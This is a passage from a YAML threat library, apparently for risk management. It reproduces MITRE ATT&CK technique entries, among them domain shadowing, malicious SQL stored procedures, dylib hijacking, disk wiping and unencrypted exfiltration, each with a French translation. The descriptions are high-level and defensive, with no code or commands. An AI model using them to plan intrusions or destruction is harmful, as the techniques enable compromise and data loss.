      Adversaries who compromise a domain may also engage in domain shadowing by creating
      malicious subdomains under their control while keeping any existing DNS records.
      As service will not be disrupted, the malicious subdomains may go unnoticed
      for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)

      https://attack.mitre.org/techniques/T1584/001'
    translations:
      fr:
        name: Domaines
        description: "Les adversaires peuvent d\xE9tourner des domaines et/ou des\
          \ sous-domaines qui peuvent \xEAtre utilis\xE9s lors du ciblage. Le d\xE9\
          tournement d\u2019enregistrement de domaine est l\u2019acte de modifier\
          \ l\u2019enregistrement d\u2019un nom de domaine sans l\u2019autorisation\
          \ du titulaire d\u2019origine. (Citation : ICANNDomainNameHijacking) Les\
          \ adversaires peuvent acc\xE9der au compte de messagerie de la personne\
          \ r\xE9pertori\xE9e comme propri\xE9taire du domaine. L\u2019adversaire\
          \ peut alors pr\xE9tendre qu\u2019il a oubli\xE9 son mot de passe afin d\u2019\
          apporter des modifications \xE0 l\u2019enregistrement du domaine. D\u2019\
          autres possibilit\xE9s incluent l\u2019ing\xE9nierie sociale d\u2019un service\
          \ d\u2019assistance \xE0 l\u2019enregistrement de domaine pour acc\xE9der\
          \ \xE0 un compte, tirer parti des lacunes du processus de renouvellement\
          \ ou compromettre un service cloud qui permet de g\xE9rer des domaines (par\
          \ exemple, AWS Route53). (Citation : Krebs DNS Hijack 2019)\n\nLe d\xE9\
          tournement de sous-domaine peut se produire lorsque les organisations ont\
          \ des entr\xE9es DNS qui pointent vers des ressources inexistantes ou d\xE9\
          provisionn\xE9es. Dans de tels cas, un adversaire peut prendre le contr\xF4\
          le d\u2019un sous-domaine pour mener des op\xE9rations au profit de la confiance\
          \ associ\xE9e \xE0 ce domaine. (Citation : Microsoft Sub Takeover 2020)\n\
          \nLes adversaires qui compromettent un domaine peuvent \xE9galement se livrer\
          \ \xE0 l\u2019observation de domaine en cr\xE9ant des sous-domaines malveillants\
          \ sous leur contr\xF4le tout en conservant les enregistrements DNS existants.\
          \ Comme le service ne sera pas interrompu, les sous-domaines malveillants\
          \ peuvent passer inaper\xE7us pendant de longues p\xE9riodes. (Citation\
          \ : Palo Alto Unit 42 Domain Shadowing 2022)\nhttps://attack.mitre.org/techniques/T1584/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1505.001
    ref_id: T1505.001
    name: SQL Stored Procedures
    description: "Adversaries may abuse SQL stored procedures to establish persistent\
      \ access to systems. SQL Stored Procedures are code that can be saved and reused\
      \ so that database users do not waste time rewriting frequently used SQL queries.\
      \ Stored procedures can be invoked via SQL statements to the database using\
      \ the procedure name or via defined events (e.g. when a SQL server application\
      \ is started/restarted).\n\nAdversaries may craft malicious stored procedures\
      \ that can provide a persistence mechanism in SQL database servers.(Citation:\
      \ NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute\
      \ operating system commands through SQL syntax the adversary may have to enable\
      \ additional functionality, such as xp_cmdshell for MSSQL Server.(Citation:\
      \ NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation:\
      \ Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language\
      \ runtime (CLR) integration. With CLR integration enabled, application developers\
      \ can write stored procedures using any .NET framework language (e.g. VB .NET,\
      \ C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft\
      \ or modify CLR assemblies that are linked to stored procedures since these\
      \ CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI\
      \ SQL Server CLR)\nhttps://attack.mitre.org/techniques/T1505/001"
    translations:
      fr:
        name: "Proc\xE9dures stock\xE9es SQL"
        description: "Les adversaires peuvent abuser des proc\xE9dures stock\xE9es\
          \ SQL pour \xE9tablir un acc\xE8s persistant aux syst\xE8mes. Les proc\xE9\
          dures stock\xE9es SQL sont du code qui peut \xEAtre enregistr\xE9 et r\xE9\
          utilis\xE9 afin que les utilisateurs de la base de donn\xE9es ne perdent\
          \ pas de temps \xE0 r\xE9\xE9crire les requ\xEAtes SQL fr\xE9quemment utilis\xE9\
          es. Les proc\xE9dures stock\xE9es peuvent \xEAtre appel\xE9es \xE0 la base\
          \ de donn\xE9es via des instructions SQL \xE0 l\u2019aide du nom de la proc\xE9\
          dure ou via des \xE9v\xE9nements d\xE9finis (par exemple, lors du d\xE9\
          marrage/red\xE9marrage d\u2019une application SQL Server).\n\nLes adversaires\
          \ peuvent cr\xE9er des proc\xE9dures stock\xE9es malveillantes qui peuvent\
          \ fournir un m\xE9canisme de persistance dans les serveurs de base de donn\xE9\
          es SQL. (Citation : Proc\xE9dures stock\xE9es de d\xE9marrage NetSPI)(Citation\
          \ : Kaspersky MSSQL ao\xFBt 2019) Pour ex\xE9cuter des commandes du syst\xE8\
          me d\u2019exploitation via la syntaxe SQL, l\u2019adversaire peut avoir\
          \ \xE0 activer des fonctionnalit\xE9s suppl\xE9mentaires, telles que xp_cmdshell\
          \ pour MSSQL Server. (Citation : Proc\xE9dures stock\xE9es de d\xE9marrage\
          \ NetSPI)(Citation : Kaspersky MSSQL ao\xFBt 2019)(Citation : Microsoft\
          \ xp_cmdshell 2017) \n\nMicrosoft SQL Server peut activer l\u2019int\xE9\
          gration du Common Language Runtime (CLR). Lorsque l\u2019int\xE9gration\
          \ CLR est activ\xE9e, les d\xE9veloppeurs d\u2019applications peuvent \xE9\
          crire des proc\xE9dures stock\xE9es \xE0 l\u2019aide de n\u2019importe quel\
          \ langage de framework .NET (e.g. VB .NET, C#, etc.). (Citation : Int\xE9\
          gration Microsoft CLR 2017) Les adversaires peuvent cr\xE9er ou modifier\
          \ des assemblys CLR li\xE9s \xE0 des proc\xE9dures stock\xE9es, car ces\
          \ assemblys CLR peuvent \xEAtre con\xE7us pour ex\xE9cuter des commandes\
          \ arbitraires. (R\xE9f\xE9rence : NetSPI SQL Server CLR)\nhttps://attack.mitre.org/techniques/T1505/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556.004
    ref_id: T1556.004
    name: Network Device Authentication
    description: 'Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001)
      to hard code a password in the operating system, thus bypassing of native authentication
      mechanisms for local accounts on network devices.


      [Modify System Image](https://attack.mitre.org/techniques/T1601) may include
      implanted code to the operating system for network devices to provide access
      for adversaries using a specific password.  The modification includes a specific
      password which is implanted in the operating system image via the patch.  Upon
      authentication attempts, the inserted code will first check to see if the user
      input is the password. If so, access is granted. Otherwise, the implanted code
      will pass the credentials on for verification of potentially valid credentials.(Citation:
      Mandiant - Synful Knock)

      https://attack.mitre.org/techniques/T1556/004'
    translations:
      fr:
        name: "Authentification des p\xE9riph\xE9riques r\xE9seau"
        description: "Les adversaires peuvent utiliser [Patch System Image](https://attack.mitre.org/techniques/T1601/001)\
          \ pour coder en dur un mot de passe dans le syst\xE8me d\u2019exploitation,\
          \ contournant ainsi les m\xE9canismes d\u2019authentification natifs pour\
          \ les comptes locaux sur les p\xE9riph\xE9riques r\xE9seau.\n\n[Modifier\
          \ l\u2019image syst\xE8me](https://attack.mitre.org/techniques/T1601) peut\
          \ inclure un code implant\xE9 dans le syst\xE8me d\u2019exploitation pour\
          \ les p\xE9riph\xE9riques r\xE9seau afin de fournir un acc\xE8s aux adversaires\
          \ \xE0 l\u2019aide d\u2019un mot de passe sp\xE9cifique.  La modification\
          \ inclut un mot de passe sp\xE9cifique qui est implant\xE9 dans l\u2019\
          image du syst\xE8me d\u2019exploitation via le patch.  Lors des tentatives\
          \ d\u2019authentification, le code ins\xE9r\xE9 v\xE9rifie d\u2019abord\
          \ si l\u2019entr\xE9e de l\u2019utilisateur est le mot de passe. Dans l\u2019\
          affirmative, l\u2019acc\xE8s est accord\xE9. Sinon, le code implant\xE9\
          \ transmettra les informations d\u2019identification pour la v\xE9rification\
          \ des informations d\u2019identification potentiellement valides. (Citation\
          \ : Mandiant - Synful Knock)\nhttps://attack.mitre.org/techniques/T1556/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1561.001
    ref_id: T1561.001
    name: Disk Content Wipe
    description: 'Adversaries may erase the contents of storage devices on specific
      systems or in large numbers in a network to interrupt availability to system
      and network resources.


      Adversaries may partially or completely overwrite the contents of a storage
      device rendering the data irrecoverable through the storage interface.(Citation:
      Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation:
      DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files,
      adversaries with destructive intent may wipe arbitrary portions of disk content.
      To wipe disk content, adversaries may acquire direct access to the hard drive
      in order to overwrite arbitrarily sized portions of disk with random data.(Citation:
      Novetta Blockbuster Destructive Malware) Adversaries have also been observed
      leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364)
      to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta
      Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485)
      because sections of the disk are erased instead of individual files.


      To maximize impact on the target organization in operations where network-wide
      availability interruption is the goal, malware used for wiping disk content
      may have worm-like features to propagate across a network by leveraging additional
      techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta
      Blockbuster Destructive Malware)

      https://attack.mitre.org/techniques/T1561/001'
    translations:
      fr:
        name: Effacement du contenu du disque
        description: "Les adversaires peuvent effacer le contenu des p\xE9riph\xE9\
          riques de stockage sur des syst\xE8mes sp\xE9cifiques ou en grand nombre\
          \ dans un r\xE9seau pour interrompre la disponibilit\xE9 des ressources\
          \ syst\xE8me et r\xE9seau.\n\nLes adversaires peuvent \xE9craser partiellement\
          \ ou compl\xE8tement le contenu d\u2019un p\xE9riph\xE9rique de stockage,\
          \ rendant les donn\xE9es irr\xE9cup\xE9rables via l\u2019interface de stockage.\
          \ (Citation : Novetta Blockbuster)(Citation : Logiciel malveillant destructeur\
          \ Novetta Blockbuster)(Citation : DOJ Lazarus Sony 2018) Au lieu d\u2019\
          effacer des structures de disque ou des fichiers sp\xE9cifiques, les adversaires\
          \ ayant des intentions destructrices peuvent effacer des parties arbitraires\
          \ du contenu du disque. Pour effacer le contenu du disque, les adversaires\
          \ peuvent acqu\xE9rir un acc\xE8s direct au disque dur afin d\u2019\xE9\
          craser des parties de disque de taille arbitraire avec des donn\xE9es al\xE9\
          atoires. (Citation : Logiciel malveillant destructeur Novetta Blockbuster)\
          \ Des adversaires ont \xE9galement \xE9t\xE9 observ\xE9s en train d\u2019\
          exploiter des pilotes tiers tels que [RawDisk](https://attack.mitre.org/software/S0364)\
          \ pour acc\xE9der directement au contenu du disque. (Citation : Novetta\
          \ Blockbuster)(Citation : Logiciel malveillant destructeur Novetta Blockbuster)\
          \ Ce comportement est distinct de [Destruction de donn\xE9es](https://attack.mitre.org/techniques/T1485)\
          \ car des sections du disque sont effac\xE9es au lieu de fichiers individuels.\n\
          \nPour maximiser l\u2019impact sur l\u2019organisation cible dans les op\xE9\
          rations o\xF9 l\u2019interruption de la disponibilit\xE9 \xE0 l\u2019\xE9\
          chelle du r\xE9seau est l\u2019objectif, les programmes malveillants utilis\xE9\
          s pour effacer le contenu du disque peuvent avoir des fonctionnalit\xE9\
          s similaires \xE0 celles d\u2019un ver pour se propager sur un r\xE9seau\
          \ en exploitant des techniques suppl\xE9mentaires telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Vidage des informations d\u2019identification du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages SMB/Windows Admin](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : Logiciel malveillant destructeur Novetta Blockbuster)\nhttps://attack.mitre.org/techniques/T1561/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1213.005
    ref_id: T1213.005
    name: Messaging Applications
    description: "Adversaries may leverage chat and messaging applications, such as\
      \ Microsoft Teams, Google Chat, and Slack, to mine valuable information.  \n\
      \nThe following is a brief list of example information that may hold potential\
      \ value to an adversary and may also be found on messaging applications: \n\n\
      * Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008))\
      \ \n* Source code snippets \n* Links to network shares and other internal resources\
      \ \n* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)\n* Discussions\
      \ about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker\
      \ 2021)(Citation: Microsoft DEV-0537)\n\nIn addition to exfiltrating data from\
      \ messaging applications, adversaries may leverage data from chat messages in\
      \ order to improve their targeting - for example, by learning more about an\
      \ environment or evading ongoing incident response efforts.(Citation: Sentinel\
      \ Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)\nhttps://attack.mitre.org/techniques/T1213/005"
    translations:
      fr:
        name: Applications de messagerie
        description: "Les adversaires peuvent exploiter des applications de chat et\
          \ de messagerie, telles que Microsoft Teams, Google Chat et Slack, pour\
          \ extraire des informations pr\xE9cieuses.  \n\nVoici une br\xE8ve liste\
          \ d\u2019exemples d\u2019informations susceptibles d\u2019\xEAtre utiles\
          \ \xE0 un adversaire et qui peuvent \xE9galement \xEAtre trouv\xE9es sur\
          \ des applications de messagerie : \n\n* R\xE9f\xE9rences de test/d\xE9\
          veloppement (c\u2019est-\xE0-dire, [Messages de chat](https://attack.mitre.org/techniques/T1552/008))\
          \ \n* Extraits de code source \n* Liens vers des partages de r\xE9seau et\
          \ d\u2019autres ressources internes \n* Donn\xE9es exclusives(Citation\_\
          : Guardian Grand Theft Auto Leak 2022)\n* Discussions sur les efforts de\
          \ r\xE9ponse aux incidents en cours(Citation\_: SC Magazine Ragnar Locker\
          \ 2021)(Citation\_: Microsoft DEV-0537)\n\nEn plus d\u2019exfiltrer les\
          \ donn\xE9es des applications de messagerie, les adversaires peuvent exploiter\
          \ les donn\xE9es des messages de chat afin d\u2019am\xE9liorer leur ciblage,\
          \ par exemple en en apprenant davantage sur un environnement ou en \xE9\
          vitant les efforts de r\xE9ponse aux incidents en cours. (Citation : Sentinel\
          \ Labs NullBulge 2024)(Citation : Permiso Scatter Spider 2023)\nhttps://attack.mitre.org/techniques/T1213/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.003
    ref_id: T1048.003
    name: Exfiltration Over Unencrypted Non-C2 Protocol
    description: 'Adversaries may steal data by exfiltrating it over an un-encrypted
      network protocol other than that of the existing command and control channel.
      The data may also be sent to an alternate network location from the main command
      and control server.(Citation: copy_cmd_cisco)


      Adversaries may opt to obfuscate this data, without the use of encryption, within
      network protocols that are natively unencrypted (such as HTTP, FTP, or DNS).
      This may include custom or publicly available encoding/compression algorithms
      (such as base64) as well as embedding data within protocol headers and fields.

      https://attack.mitre.org/techniques/T1048/003'
    translations:
      fr:
        name: "Exfiltration via un protocole non C2 non chiffr\xE9"
        description: "Les adversaires peuvent voler des donn\xE9es en les exfiltrant\
          \ via un protocole r\xE9seau non chiffr\xE9 autre que celui du canal de\
          \ commande et de contr\xF4le existant. Les donn\xE9es peuvent \xE9galement\
          \ \xEAtre envoy\xE9es \xE0 un autre emplacement r\xE9seau \xE0 partir du\
          \ serveur de commande et de contr\xF4le principal. (R\xE9f\xE9rence : copy_cmd_cisco)\n\
          \nLes adversaires peuvent choisir d\u2019obscurcir ces donn\xE9es, sans\
          \ utiliser de chiffrement, dans des protocoles r\xE9seau qui ne sont pas\
          \ chiffr\xE9s en mode natif (tels que HTTP, FTP ou DNS). Il peut s\u2019\
          agir d\u2019algorithmes d\u2019encodage/compression personnalis\xE9s ou\
          \ accessibles au public (tels que base64), ainsi que de l\u2019int\xE9gration\
          \ de donn\xE9es dans des en-t\xEAtes et des champs de protocole.\nhttps://attack.mitre.org/techniques/T1048/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.004
    ref_id: T1574.004
    name: Dylib Hijacking
    description: 'Adversaries may execute their own payloads by placing a malicious
      dynamic library (dylib) with an expected name in a path a victim application
      searches at runtime. The dynamic loader will try to find the dylibs based on
      the sequential order of the search paths. Paths to dylibs may be prefixed with
      <code>@rpath</code>, which allows developers to use relative paths to specify
      an array of search paths used at runtime based on the location of the executable.  Additionally,
      if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function,
      an application will still execute even if an expected dylib is not present.
      Weak linking enables developers to run an application on multiple macOS versions
      as new APIs are added.


      Adversaries may gain execution by inserting malicious dylibs with the name of
      the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable
      Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject
      HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are
      loaded into an application''s address space allowing the malicious dylib to
      inherit the application''s privilege level and resources. Based on the application,
      this could result in privilege escalation and uninhibited network access. This
      method may also evade detection from security products since the execution is
      masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation:
      wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection
      MachO)

      https://attack.mitre.org/techniques/T1574/004'
    translations:
      fr:
        name: "D\xE9tournement de Dylib"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ en pla\xE7ant une biblioth\xE8que dynamique malveillante (dylib) avec\
          \ un nom attendu dans un chemin d\u2019acc\xE8s qu\u2019une application\
          \ victime recherche au moment de l\u2019ex\xE9cution. Le chargeur dynamique\
          \ essaiera de trouver les dylibs en fonction de l\u2019ordre s\xE9quentiel\
          \ des chemins de recherche. Les chemins d\u2019acc\xE8s aux dylibs peuvent\
          \ \xEAtre pr\xE9c\xE9d\xE9s <code>d\u2019un @rpath</code>, ce qui permet\
          \ aux d\xE9veloppeurs d\u2019utiliser des chemins relatifs pour sp\xE9cifier\
          \ un tableau de chemins de recherche utilis\xE9s au moment de l\u2019ex\xE9\
          cution en fonction de l\u2019emplacement de l\u2019ex\xE9cutable.  De plus,\
          \ si une liaison faible est utilis\xE9e, telle que la fonction <code>LC_LOAD_WEAK_DYLIB</code>,\
          \ une application s\u2019ex\xE9cutera toujours m\xEAme si une dylib attendue\
          \ n\u2019est pas pr\xE9sente. Les liens faibles permettent aux d\xE9veloppeurs\
          \ d\u2019ex\xE9cuter une application sur plusieurs versions de macOS au\
          \ fur et \xE0 mesure que de nouvelles API sont ajout\xE9es.\n\nLes adversaires\
          \ peuvent obtenir l\u2019ex\xE9cution en ins\xE9rant des dylibs malveillants\
          \ avec le nom du dylib manquant dans le chemin identifi\xE9. (Citation :\
          \ Wardle Dylib Hijack Vulnerable Apps)(Citation : Wardle Dylib Hijacking\
          \ OSX 2015)(Citation : Github EmpireProject HijackScanner)(Citation : Github\
          \ EmpireProject CreateHijacker Dylib) Les Dylib sont charg\xE9s dans l\u2019\
          espace d\u2019adressage d\u2019une application, ce qui permet \xE0 la dylib\
          \ malveillante d\u2019h\xE9riter du niveau de privil\xE8ge et des ressources\
          \ de l\u2019application. Selon l\u2019application, cela peut entra\xEEner\
          \ une \xE9l\xE9vation de privil\xE8ges et un acc\xE8s r\xE9seau sans entrave.\
          \ Cette m\xE9thode peut \xE9galement \xE9chapper \xE0 la d\xE9tection des\
          \ produits de s\xE9curit\xE9 puisque l\u2019ex\xE9cution est masqu\xE9e\
          \ par un processus l\xE9gitime. (Citation : \xC9crire un mauvais logiciel\
          \ malveillant pour OSX)(Citation : wardle artofmalware volume1)(Citation\
          \ : MalwareUnicorn macOS Dylib Injection MachO)\nhttps://attack.mitre.org/techniques/T1574/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1601.002
    ref_id: T1601.002
    name: Downgrade System Image
    description: 'Adversaries may install an older version of the operating system
      of a network device to weaken security.  Older operating system versions on
      network devices often have weaker encryption ciphers and, in general, fewer/less
      updated defensive features. (Citation: Cisco Synful Knock Evolution)


      On embedded devices, downgrading the version typically only requires replacing
      the operating system file in storage.  With most embedded devices, this can
      be achieved by downloading a copy of the desired version of the operating system
      file and reconfiguring the device to boot from that file on next system restart.  The
      adversary could then restart the device to implement the change immediately
      or they could wait until the next time the system restarts.


      Downgrading the system image to an older versions may allow an adversary to
      evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading
      of a system image can be done on its own, or it can be used in conjunction with
      [Patch System Image](https://attack.mitre.org/techniques/T1601/001).

      https://attack.mitre.org/techniques/T1601/002'
    translations:
      fr:
        name: "R\xE9trograder l\u2019image syst\xE8me"
        description: "Les adversaires peuvent installer une ancienne version du syst\xE8\
          me d\u2019exploitation d\u2019un p\xE9riph\xE9rique r\xE9seau pour affaiblir\
          \ la s\xE9curit\xE9.  Les anciennes versions du syst\xE8me d\u2019exploitation\
          \ sur les p\xE9riph\xE9riques r\xE9seau ont souvent des chiffrements de\
          \ chiffrement plus faibles et, en g\xE9n\xE9ral, des fonctionnalit\xE9s\
          \ d\xE9fensives moins nombreuses/moins mises \xE0 jour. (Citation : Cisco\
          \ Synful Knock Evolution)\n\nSur les p\xE9riph\xE9riques int\xE9gr\xE9s,\
          \ la r\xE9trogradation de la version ne n\xE9cessite g\xE9n\xE9ralement\
          \ que le remplacement du fichier du syst\xE8me d\u2019exploitation dans\
          \ le stockage.  Avec la plupart des p\xE9riph\xE9riques int\xE9gr\xE9s,\
          \ cela peut \xEAtre r\xE9alis\xE9 en t\xE9l\xE9chargeant une copie de la\
          \ version souhait\xE9e du fichier du syst\xE8me d\u2019exploitation et en\
          \ reconfigurant le p\xE9riph\xE9rique pour qu\u2019il d\xE9marre \xE0 partir\
          \ de ce fichier au prochain red\xE9marrage du syst\xE8me.  L\u2019adversaire\
          \ peut alors red\xE9marrer l\u2019appareil pour mettre en \u0153uvre la\
          \ modification imm\xE9diatement ou attendre le prochain red\xE9marrage du\
          \ syst\xE8me.\n\nLa r\xE9trogradation de l\u2019image syst\xE8me vers une\
          \ version ant\xE9rieure peut permettre \xE0 un adversaire d\u2019\xE9chapper\
          \ aux d\xE9fenses en activant des comportements tels que [Affaiblir le chiffrement](https://attack.mitre.org/techniques/T1600).\
          \  La r\xE9trogradation d\u2019une image syst\xE8me peut \xEAtre effectu\xE9\
          e seule ou elle peut \xEAtre utilis\xE9e conjointement avec [Patch System\
          \ Image](https://attack.mitre.org/techniques/T1601/001).\nhttps://attack.mitre.org/techniques/T1601/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.003
    ref_id: T1078.003
    name: Local Accounts
    description: 'Adversaries may obtain and abuse credentials of a local account
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion. Local accounts are those configured by an organization for
      use by users, remote support, services, or for administration on a single system
      or service.


      Local Accounts may also be abused to elevate privileges and harvest credentials
      through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
      Password reuse may allow the abuse of local accounts across a set of machines
      on a network for the purposes of Privilege Escalation and Lateral Movement.

      https://attack.mitre.org/techniques/T1078/003'
    translations:
      fr:
        name: Comptes locaux
        description: "Les adversaires peuvent obtenir et abuser des identifiants d\u2019\
          un compte local comme moyen d\u2019obtenir l\u2019acc\xE8s initial, la persistance,\
          \ l\u2019\xE9l\xE9vation de privil\xE8ges ou l\u2019\xE9vasion de la d\xE9\
          fense. Les comptes locaux sont ceux configur\xE9s par une organisation pour\
          \ une utilisation par les utilisateurs, le support \xE0 distance, les services\
          \ ou pour l\u2019administration sur un syst\xE8me ou un service unique.\n\
          \nLes comptes locaux peuvent \xE9galement \xEAtre utilis\xE9s de mani\xE8\
          re abusive pour \xE9lever les privil\xE8ges et r\xE9colter des informations\
          \ d\u2019identification via [Vidage des informations d\u2019identification\
          \ du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003).\
          \ La r\xE9utilisation du mot de passe peut permettre l\u2019utilisation\
          \ abusive de comptes locaux sur un ensemble de machines sur un r\xE9seau\
          \ \xE0 des fins d\u2019\xE9l\xE9vation de privil\xE8ges et de mouvement\
          \ lat\xE9ral.\nhttps://attack.mitre.org/techniques/T1078/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1211
    ref_id: T1211
    name: Exploitation for Defense Evasion
    description: "Adversaries may exploit a system or application vulnerability to\
      \ bypass security features. Exploitation of a vulnerability occurs when an adversary\
      \ takes advantage of a programming error in a program, service, or within the\
      \ operating system software or kernel itself to execute adversary-controlled\
      \ code.\_Vulnerabilities may exist in defensive security software that can be\
      \ used to disable or circumvent them.\n\nAdversaries may have prior knowledge\
      \ through reconnaissance that security software exists within an environment\
      \ or they may perform checks during or shortly after the system is compromised\
      \ for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001).\
      \ The security software will likely be targeted directly for exploitation. There\
      \ are examples of antivirus software being targeted by persistent threat groups\
      \ to avoid detection.\n\nThere have also been examples of vulnerabilities in\
      \ public cloud infrastructure of SaaS applications that may bypass defense boundaries\
      \ (Citation: Salesforce zero-day in facebook phishing attack), evade security\
      \ logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden\
      \ infrastructure.(Citation: GhostToken GCP flaw)\nhttps://attack.mitre.org/techniques/T1211"
    translations:
      fr:
        name: "L\u2019exploitation \xE0 des fins d\u2019\xE9vasion de d\xE9fense"
        description: "Les adversaires peuvent exploiter une vuln\xE9rabilit\xE9 d\u2019\
          un syst\xE8me ou d\u2019une application pour contourner les fonctionnalit\xE9\
          s de s\xE9curit\xE9. L\u2019exploitation d\u2019une vuln\xE9rabilit\xE9\
          \ se produit lorsqu\u2019un adversaire tire parti d\u2019une erreur de programmation\
          \ dans un programme, un service ou dans le logiciel ou le noyau du syst\xE8\
          me d\u2019exploitation lui-m\xEAme pour ex\xE9cuter du code contr\xF4l\xE9\
          \ par l\u2019adversaire.\_Des vuln\xE9rabilit\xE9s peuvent exister dans\
          \ les logiciels de s\xE9curit\xE9 d\xE9fensive qui peuvent \xEAtre utilis\xE9\
          es pour les d\xE9sactiver ou les contourner.\n\nLes adversaires peuvent\
          \ avoir connaissance, gr\xE2ce \xE0 la reconnaissance, de l\u2019existence\
          \ d\u2019un logiciel de s\xE9curit\xE9 dans un environnement, ou ils peuvent\
          \ effectuer des v\xE9rifications pendant ou peu de temps apr\xE8s la compromission\
          \ du syst\xE8me pour [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001).\
          \ Le logiciel de s\xE9curit\xE9 sera probablement cibl\xE9 directement pour\
          \ \xEAtre exploit\xE9. Il existe des exemples de logiciels antivirus cibl\xE9\
          s par des groupes de menaces persistants pour \xE9viter d\u2019\xEAtre d\xE9\
          tect\xE9s.\n\nIl existe \xE9galement des exemples de vuln\xE9rabilit\xE9\
          s dans l\u2019infrastructure de cloud public d\u2019applications SaaS qui\
          \ peuvent contourner les limites de d\xE9fense (Citation : Salesforce zero-day\
          \ dans l\u2019attaque de phishing Facebook), \xE9chapper aux journaux de\
          \ s\xE9curit\xE9 (Citation : Contourner CloudTrail dans AWS Service Catalog)\
          \ ou d\xE9ployer une infrastructure cach\xE9e. (Citation : Faille GCP de\
          \ GhostToken)\nhttps://attack.mitre.org/techniques/T1211"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127
    ref_id: T1127
    name: Trusted Developer Utilities Proxy Execution
    description: 'Adversaries may take advantage of trusted developer utilities to
      proxy execution of malicious payloads. There are many utilities used for software
      development related tasks that can be used to execute code in various forms
      to assist in development, debugging, and reverse engineering.(Citation: engima0x3
      DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation:
      LOLBAS Tracker) These utilities may often be signed with legitimate certificates
      that allow them to execute on a system and proxy execution of malicious code
      through a trusted process that effectively bypasses application control solutions.

      https://attack.mitre.org/techniques/T1127'
    translations:
      fr:
        name: "Ex\xE9cution du proxy Trusted Developer Utilities"
        description: "Les adversaires peuvent tirer parti d\u2019utilitaires de d\xE9\
          veloppement approuv\xE9s pour proxy l\u2019ex\xE9cution de charges utiles\
          \ malveillantes. Il existe de nombreux utilitaires utilis\xE9s pour les\
          \ t\xE2ches li\xE9es au d\xE9veloppement de logiciels qui peuvent \xEAtre\
          \ utilis\xE9s pour ex\xE9cuter du code sous diverses formes afin d\u2019\
          aider au d\xE9veloppement, au d\xE9bogage et \xE0 la r\xE9tro-ing\xE9nierie.\
          \ (Citation : engima0x3 DNX Bypass)(Citation : engima0x3 RCSI Bypass)(Citation\
          \ : Exploit Monday WinDbg)(Citation : LOLBAS Tracker) Ces utilitaires peuvent\
          \ souvent \xEAtre sign\xE9s avec des certificats l\xE9gitimes qui leur permettent\
          \ de s\u2019ex\xE9cuter sur un syst\xE8me et l\u2019ex\xE9cution proxy de\
          \ code malveillant par le biais d\u2019un processus fiable qui contourne\
          \ efficacement les solutions de contr\xF4le des applications.\nhttps://attack.mitre.org/techniques/T1127"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1529
    ref_id: T1529
    name: System Shutdown/Reboot
    description: 'Adversaries may shutdown/reboot systems to interrupt access to,
      or aid in the destruction of, those systems. Operating systems may contain commands
      to initiate a shutdown/reboot of a machine or network device. In some cases,
      these commands may also be used to initiate a shutdown/reboot of a remote computer
      or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation:
      alert_TA18_106A)


      Shutting down or rebooting systems may disrupt access to computer resources
      for legitimate users while also impeding incident response/recovery.


      Adversaries may attempt to shutdown/reboot a system after impacting it in other
      ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002)
      or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to
      hasten the intended effects on system availability.(Citation: Talos Nyetya June
      2017)(Citation: Talos Olympic Destroyer 2018)

      https://attack.mitre.org/techniques/T1529'
    translations:
      fr:
        name: "Arr\xEAt/red\xE9marrage du syst\xE8me"
